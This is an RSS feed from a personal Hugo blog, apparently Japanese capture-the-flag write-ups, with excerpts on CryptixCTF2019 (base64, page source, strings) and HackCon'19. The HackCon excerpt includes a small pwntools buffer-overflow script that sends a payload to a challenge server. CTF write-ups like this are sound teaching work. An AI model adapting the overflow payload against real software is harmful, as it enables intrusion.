<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Posts on kuzushikiのぺーじ</title>
    <link>https://kuzushiki.github.io/post/</link>
    <description>Recent content in Posts on kuzushikiのぺーじ</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <copyright>© Copyright 2020 kuzushiki</copyright>
    <lastBuildDate>Sat, 15 Feb 2020 00:26:10 +0900</lastBuildDate>
    
	<atom:link href="https://kuzushiki.github.io/post/index.xml" rel="self" type="application/rss+xml" />
    
    
    <item>
      <title>CryptixCTF2019</title>
      <link>https://kuzushiki.github.io/post/cryptixctf2019/</link>
      <pubDate>Sat, 15 Feb 2020 00:26:10 +0900</pubDate>
      
      <guid>https://kuzushiki.github.io/post/cryptixctf2019/</guid>
      <description>CryptixCTF 2019に参加しました！ (team:score_gazer)
結果は2095点で19位でした。 あと一問で全完だったのに…悔しい。
それでは解いた問題について解説していきます！
※解説を「ですます調」でやるとしっくりこないので、「だである調」に変えています。
Make yourself comfortable (レベル１) Welcome gift ポイント  base64  解く ZmxhZ3t3ZWxjb21lX3RvX2NyeXB0aXhDVEZfYmFzZTY0aXRpc30Kをbase64でデコード
フラグ flag{welcome_to_cryptixCTF_base64itis}
You made it here! ポイント  デベロッパーツール(Chromeの場合)でソースを確認できる。  解く 問題ページのソースを見る。
フラグの一部を確認
&amp;lt;!--Came for the flag? Bingo! first part: flag{Pr3tty_ --&amp;gt; Sourcesタブに行き、style.cssとscript.jsも見てみる。
同様にフラグの一部が書いてあるので組み合わせる。
フラグ flag{Pr3tty_b4s1c_5tuff}
Secret Code ポイント  stringsコマンドでファイルの文字列を確認できる。  解く stringsコマンドで問題ファイルの文字列を確認 grepコマンドをつけることで結果を絞り込める。
:# strings secret_code | grep flag{ flag{sTring5_To_tH3_R35cU3} フラグ flag{sTring5_To_tH3_R35cU3}
Moving On (レベル２) Mixed Up ポイント   単一換字暗号</description>
    </item>
    
    <item>
      <title>HackCon&#39;19 write up</title>
      <link>https://kuzushiki.github.io/post/hackcon2019/</link>
      <pubDate>Fri, 14 Feb 2020 23:57:33 +0900</pubDate>
      
      <guid>https://kuzushiki.github.io/post/hackcon2019/</guid>
      <description>HackCon&amp;rsquo;19に参加しました！ (team:score_gazer)
結果は705点で112位でした
baby b0f (Pwn 100 pt) ポイント  バッファオーバーフロー（以下BOF）  解く プログラムを実行するといきなり入力を求められる
 間違った入力をするとTry Againと表示される  デバッガで逆アセンブルしつつ実行
どうやらこの比較命令が怪しい
RIP: 0x400760 (&amp;lt;main+153&amp;gt;:	cmp DWORD PTR [rbp-0x4],0xdeadbeef) BOFしてここを一致させることを考える
以下のコマンドでrsp,rbpを表示
x/32xw $rsp x/32xw $rbp 以下の行に注目
0x7fffffffdeb0:	0x4141dfa0	0x000a4141	0x00000000	0xcafebabe 今回はAAAAと入力したが，その入力値が確認できる(Aは0x41に相当)
さらに，0xcafebabeは[rbp-0x4]であることも分かる
つまり，0xcafebabeの部分を0xdeadbeefにできれば良い
ペイロードを作ってサーバに投げるプログラムを作って実行
from pwn import * import socket con = remote(&amp;#39;68.183.158.95&amp;#39;, 8989) payload = b&amp;#39;A&amp;#39; * 10 payload += b&amp;#39;\xef\xbe\xad\xde&amp;#39; con.sendline(payload) con.interactive() フラグゲット
補足   実は初めて解いたPwn問だったりする
  Pwntoolsを使用してます</description>
    </item>
    
    <item>
      <title>First Post</title>
      <link>https://kuzushiki.github.io/post/first-post/</link>
      <pubDate>Fri, 14 Feb 2020 23:11:29 +0900</pubDate>
      
      <guid>https://kuzushiki.github.io/post/first-post/</guid>
      <description>テストですよ</description>
    </item>
    
  </channel>
</rss>